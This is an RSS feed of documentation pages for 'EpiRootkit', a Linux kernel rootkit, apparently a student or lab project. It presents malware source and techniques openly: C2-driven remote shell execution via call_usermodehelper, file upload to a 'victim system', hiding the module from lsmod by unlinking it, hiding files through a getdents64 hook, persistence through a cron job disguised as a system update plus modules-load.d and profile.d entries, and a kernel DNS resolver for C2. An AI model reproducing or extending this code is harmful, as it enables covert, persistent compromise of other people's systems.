<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Features on Tux Fan Club Docs</title><link>/docs/05-epirootkit/features/</link><description>Recent content in Features on Tux Fan Club Docs</description><generator>Hugo</generator><language>en</language><lastBuildDate>Fri, 30 May 2025 14:14:32 +0200</lastBuildDate><atom:link href="/docs/05-epirootkit/features/index.xml" rel="self" type="application/rss+xml"/><item><title>Command Execution</title><link>/docs/05-epirootkit/features/command-execution/</link><pubDate>Sun, 25 May 2025 00:00:00 +0100</pubDate><guid>/docs/05-epirootkit/features/command-execution/</guid><description>&lt;h1 id="command-execution">Command Execution &lt;a href="#command-execution" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>Execute shell commands remotely through the rootkit with full output capture.&lt;/p>
&lt;h2 id="how-it-works">How It Works &lt;a href="#how-it-works" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;ol>
&lt;li>&lt;strong>C2 sends command&lt;/strong> via network&lt;/li>
&lt;li>&lt;strong>Rootkit executes&lt;/strong> using &lt;code>call_usermodehelper()&lt;/code> with &lt;code>/bin/sh -c&lt;/code>&lt;/li>
&lt;li>&lt;strong>Captures output&lt;/strong> by redirecting to temporary file&lt;/li>
&lt;li>&lt;strong>Returns result&lt;/strong> with exit code and output&lt;/li>
&lt;/ol>
&lt;h2 id="implementation">Implementation &lt;a href="#implementation" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="command-handler">Command Handler &lt;a href="#command-handler" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>


 
 
 

 
 
 
 

 

 &lt;div class="prism-codeblock ">
 &lt;pre id="7d71c89" class="language-c ">
 &lt;code>static int handle_exec(const char *data)
{
 char *argv[] = { &amp;#34;/bin/sh&amp;#34;, &amp;#34;-c&amp;#34;, command_copy, NULL };
 char *envp[] = { 
 &amp;#34;HOME=/&amp;#34;, 
 &amp;#34;PATH=/sbin:/bin:/usr/bin:/usr/local/bin&amp;#34;, 
 NULL 
 };
 
 // Generate unique temporary filename
 snprintf(temp_filename, sizeof(temp_filename), 
 &amp;#34;/tmp/epirootkit_out_%d&amp;#34;, atomic_inc_return(&amp;amp;exec_counter));
 
 // Build command with output redirection
 snprintf(full_command, command_len &amp;#43; temp_len &amp;#43; 32,
 &amp;#34;%s &amp;gt; %s 2&amp;gt;&amp;amp;1&amp;#34;, data, temp_filename);
 
 // Execute and capture output
 ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
 
 return send_result(formatted_result);
}&lt;/code>
 &lt;/pre>
 &lt;/div>
&lt;h3 id="output-capture">Output Capture &lt;a href="#output-capture" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;ul>
&lt;li>&lt;strong>Redirection&lt;/strong>: &lt;code>command &amp;gt; /tmp/epirootkit_out_X 2&amp;gt;&amp;amp;1&lt;/code>&lt;/li>
&lt;li>&lt;strong>File reading&lt;/strong>: Uses &lt;code>kernel_read()&lt;/code> to get output&lt;/li>
&lt;li>&lt;strong>Dynamic allocation&lt;/strong>: &lt;code>vmalloc()&lt;/code> for large outputs (up to 64KB)&lt;/li>
&lt;li>&lt;strong>Cleanup&lt;/strong>: Automatic temporary file removal&lt;/li>
&lt;/ul>
&lt;h2 id="usage">Usage &lt;a href="#usage" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="webui-terminal">WebUI Terminal &lt;a href="#webui-terminal" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;p>Interactive terminal interface with:&lt;/p></description></item><item><title>File Transfer</title><link>/docs/05-epirootkit/features/file-transfer/</link><pubDate>Sun, 25 May 2025 00:00:00 +0100</pubDate><guid>/docs/05-epirootkit/features/file-transfer/</guid><description>&lt;h1 id="file-transfer">File Transfer &lt;a href="#file-transfer" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>Transfer files between the C2 server and victim system using direct content transmission.&lt;/p>
&lt;h2 id="upload-files">Upload Files &lt;a href="#upload-files" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;p>Upload files from C2 server to victim system.&lt;/p>
&lt;h3 id="usage">Usage &lt;a href="#usage" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>


 
 
 

 
 
 
 

 

 &lt;div class="prism-codeblock ">
 &lt;pre id="c1385ed" class="language-bash ">
 &lt;code># Upload to specific path
upload Client-1 ./config.txt /etc/myapp/config.txt

# Upload to current directory 
upload Client-1 ./script.sh&lt;/code>
 &lt;/pre>
 &lt;/div>
&lt;h3 id="implementation">Implementation &lt;a href="#implementation" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>


 
 
 

 
 
 
 

 

 &lt;div class="prism-codeblock ">
 &lt;pre id="4ca9c69" class="language-c ">
 &lt;code>static int handle_upload(const char *data)
{
 char *filename, *file_content, *separator;
 struct file *file;
 loff_t pos = 0;
 
 // Parse filename:content format
 separator = strchr(data, &amp;#39;:&amp;#39;);
 *separator = &amp;#39;\0&amp;#39;;
 filename = data;
 file_content = separator &amp;#43; 1;
 
 // Create and write file
 file = filp_open(filename, O_WRONLY | O_CREAT | O_TRUNC, 0644);
 kernel_write(file, file_content, content_length, &amp;amp;pos);
 filp_close(file, NULL);
 
 return send_success(&amp;#34;File uploaded successfully&amp;#34;);
}&lt;/code>
 &lt;/pre>
 &lt;/div>
&lt;h2 id="download-files">Download Files &lt;a href="#download-files" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;p>Download files from victim system to C2 server.&lt;/p></description></item><item><title>Stealth &amp; Hiding</title><link>/docs/05-epirootkit/features/hiding/</link><pubDate>Sun, 25 May 2025 00:00:00 +0100</pubDate><guid>/docs/05-epirootkit/features/hiding/</guid><description>&lt;h1 id="stealth--hiding">Stealth &amp;amp; Hiding &lt;a href="#stealth--hiding" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>Hide the rootkit module and files from system detection using kernel hooking techniques.&lt;/p>
&lt;h2 id="module-hiding">Module Hiding &lt;a href="#module-hiding" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;p>Hide the rootkit module from &lt;code>lsmod&lt;/code> and &lt;code>/proc/modules&lt;/code> by removing it from the kernel&amp;rsquo;s module list.&lt;/p>
&lt;h3 id="implementation">Implementation &lt;a href="#implementation" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>


 
 
 

 
 
 
 

 

 &lt;div class="prism-codeblock ">
 &lt;pre id="7503503" class="language-c ">
 &lt;code>int hide_module(void)
{
 if (stealth_state.module_hidden) return 0;

 stealth_state.prev_module_entry = THIS_MODULE-&amp;gt;list.prev;
 list_del(&amp;amp;THIS_MODULE-&amp;gt;list);
 stealth_state.module_hidden = true;
 return 0;
}&lt;/code>
 &lt;/pre>
 &lt;/div>
&lt;p>&lt;strong>Technical Details:&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>Uses &lt;code>list_del()&lt;/code> to remove from kernel module list&lt;/li>
&lt;li>Stores previous entry pointer for restoration&lt;/li>
&lt;li>Thread-safe with mutex protection&lt;/li>
&lt;li>Reversible operation&lt;/li>
&lt;/ul>
&lt;h2 id="file-hiding">File Hiding &lt;a href="#file-hiding" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;p>Hide files with specific prefixes from directory listings by hooking the &lt;code>getdents64&lt;/code> syscall.&lt;/p></description></item><item><title>Persistence</title><link>/docs/05-epirootkit/features/persistence/</link><pubDate>Sun, 25 May 2025 00:00:00 +0100</pubDate><guid>/docs/05-epirootkit/features/persistence/</guid><description>&lt;h1 id="persistence">Persistence &lt;a href="#persistence" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>Multiple boot persistence mechanisms to ensure rootkit survival across system reboots.&lt;/p>
&lt;h2 id="three-mechanisms">Three Mechanisms &lt;a href="#three-mechanisms" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="1-modules-loadd">1. modules-load.d &lt;a href="#1-modules-loadd" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;p>&lt;strong>File&lt;/strong>: &lt;code>/etc/modules-load.d/epirootkit.conf&lt;/code>&lt;br>
&lt;strong>Content&lt;/strong>: &lt;code>epirootkit&lt;/code>&lt;br>
&lt;strong>Trigger&lt;/strong>: systemd reads config and loads module automatically on boot&lt;/p>
&lt;h3 id="2-cron-jobs">2. Cron Jobs &lt;a href="#2-cron-jobs" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;p>&lt;strong>File&lt;/strong>: &lt;code>/etc/cron.d/system-update&lt;/code>&lt;br>
&lt;strong>Schedule&lt;/strong>: Every 5 minutes check and load if not present&lt;br>
&lt;strong>Stealth&lt;/strong>: Disguised as system update task&lt;/p>
&lt;h3 id="3-shell-profiles">3. Shell Profiles &lt;a href="#3-shell-profiles" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;p>&lt;strong>File&lt;/strong>: &lt;code>/etc/profile.d/system-env.sh&lt;/code>&lt;br>
&lt;strong>Trigger&lt;/strong>: Executes when root user logs in&lt;br>
&lt;strong>Check&lt;/strong>: Loads module if not already present&lt;/p></description></item><item><title>DNS Resolution</title><link>/docs/05-epirootkit/features/dns-resolution/</link><pubDate>Fri, 30 May 2025 00:00:00 +0100</pubDate><guid>/docs/05-epirootkit/features/dns-resolution/</guid><description>&lt;h1 id="dns-resolution">DNS Resolution &lt;a href="#dns-resolution" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>The rootkit includes a kernel-space DNS resolver that resolves domain names to IP addresses for C2 server connections.&lt;/p>
&lt;h2 id="overview">Overview &lt;a href="#overview" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;p>The DNS resolver:&lt;/p>
&lt;ul>
&lt;li>Resolves domain names to IP addresses in kernel space&lt;/li>
&lt;li>Uses UDP DNS queries to 8.8.8.8&lt;/li>
&lt;li>Automatically falls back to direct IP if address is already an IP&lt;/li>
&lt;li>Supports A record queries for IPv4 addresses&lt;/li>
&lt;/ul>
&lt;h2 id="implementation">Implementation &lt;a href="#implementation" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="files">Files &lt;a href="#files" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;ul>
&lt;li>&lt;code>rootkit/network/dns_resolver.c&lt;/code> - DNS client implementation&lt;/li>
&lt;li>&lt;code>rootkit/network/dns_resolver.h&lt;/code> - API header&lt;/li>
&lt;/ul>
&lt;h3 id="key-function">Key Function &lt;a href="#key-function" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>


 
 
 

 
 
 
 

 

 &lt;div class="prism-codeblock ">
 &lt;pre id="b3cb8d7" class="language-c ">
 &lt;code>int kernel_dns_resolve(const char *hostname, u32 *ip_addr);&lt;/code>
 &lt;/pre>
 &lt;/div>
&lt;p>&lt;strong>Parameters:&lt;/strong>&lt;/p></description></item></channel></rss>